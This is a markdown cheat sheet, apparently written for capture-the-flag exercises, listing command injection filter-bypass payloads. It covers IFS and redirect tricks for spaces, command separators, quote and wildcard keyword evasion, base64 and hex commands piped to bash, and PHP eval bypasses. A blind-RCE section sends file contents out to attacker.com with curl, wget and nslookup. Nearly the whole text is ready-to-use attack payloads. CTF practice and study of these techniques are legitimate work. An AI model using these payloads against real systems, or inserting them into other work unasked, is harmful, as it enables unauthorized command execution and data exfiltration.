# Command Injection Bypass Techniques

## Space Bypass

| Method | Example | Notes |
|--------|---------|-------|
| `${IFS}` | `cat${IFS}flag.php` | Internal Field Separator (default: space/tab/newline) |
| `$IFS$9` | `cat$IFS$9flag.php` | `$9` is the 9th positional parameter (empty), prevents variable name ambiguity |
| `${IFS}` + variable | `a=$IFS;cat${a}flag` | Assign then reference |
| `<` | `cat<flag.php` | Redirect instead of space |
| `%09` | `cat%09flag.php` | URL-encoded tab |
| `%0a` | `cat%0aflag.php` | Newline character |
| `{cat,flag.php}` | `{cat,flag.php}` | Bash brace expansion (Bash only) |
| `%0d` | `cat%0dflag.php` | Carriage return |

### Space Bypass Selection Strategy
1. **First choice**: `$IFS$9` — best compatibility
2. **Fallback**: `<` — concise, but `<` may be filtered in some contexts
3. **URL context**: use `%09` or `%0a`

## Command Separators

| Separator | Example | Notes |
|-----------|---------|-------|
| `;` | `id;cat flag` | Execute in sequence |
| `&&` | `id && cat flag` | Execute second only if first succeeds |
| `\|\|` | `id \|\| cat flag` | Execute second only if first fails |
| `\|` | `id \| cat flag` | Pipe |
| `%0a` | `id%0acat flag` | Newline execution |
| `%0d%0a` | `id%0d%0acat flag` | CRLF |

## Command/Keyword Bypass

### String Concatenation
```bash
c'a't flag.php       # single-quote concatenation
c"a"t flag.php       # double-quote concatenation
c\at flag.php        # backslash escape
```

### Variable Concatenation
```bash
a=c;b=at;$a$b flag.php
a=fl;b=ag;cat /$a$b
```

### Wildcards
```bash
cat /f???.php        # ? matches single character
cat /f*              # * matches any characters
/bin/ca? /etc/pas?d  # also usable in paths
cat /f[a-z]ag.php    # character class
```

### Base64 Encoding
```bash
echo Y2F0IGZsYWcucGhw | base64 -d | bash
# Y2F0IGZsYWcucGhw = "cat flag.php"
```

### Hex Encoding
```bash
echo 63617420666c61672e706870 | xxd -r -p | bash
# 63617420666c61672e706870 = "cat flag.php"
```

### Using Alternative Commands

| Goal | Original | Alternatives |
|------|----------|-------------|
| Read file | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
| Read file | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
| Find file | find | ls -la / dir / echo / locate |
| Download | wget | curl / nc / python -c 'import urllib...' |
| Write file | echo > | tee / printf / python -c |

## Blind RCE (No Output)

When command execution results are not visible:

### 1. DNS Exfiltration
```bash
curl http://attacker.com/$(cat flag.php | base64)
nslookup $(cat flag.php).attacker.com
```

### 2. HTTP Exfiltration
```bash
curl http://attacker.com/?data=$(cat flag.php | base64)
wget http://attacker.com/?data=$(cat flag.php | base64)
```

### 3. Write to Accessible Path
```bash
cat flag.php > /var/www/html/flag.txt
# Then access http://target/flag.txt in browser
```

### 4. Write to Environment/Temp File
```bash
cp flag.php /tmp/flag
# Then read /tmp/flag via another vulnerability
```

### 5. Time-Based Blind
```bash
if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
# Brute force character by character
```

## PHP eval Special Bypass

### Space Filter in eval Context

```php
// When eval($cmd) and spaces in $cmd are filtered
system("cat<flag.php");      // redirect
system("cat${IFS}flag.php"); // IFS
system("cat$IFS$9flag.php"); // IFS + positional param
```

### Length Limit Bypass

```php
// When parameter length is limited (e.g. strlen > 18)
// Use PHP variable expansion
?a=system&b=cat flag.php
// eval($_GET[a]($_GET[b]));
```

### flag Keyword Replaced

```php
// When "flag" is replaced with a space
// Use wildcards
cat /f*          # * matches flag
cat /fl?g.php    # ? matches one character
cat /fla?.php
// Use path concatenation
cat /fl''ag.php  # empty string concatenation
cat /fl\ag.php   # backslash (may be interpreted as escape)
```
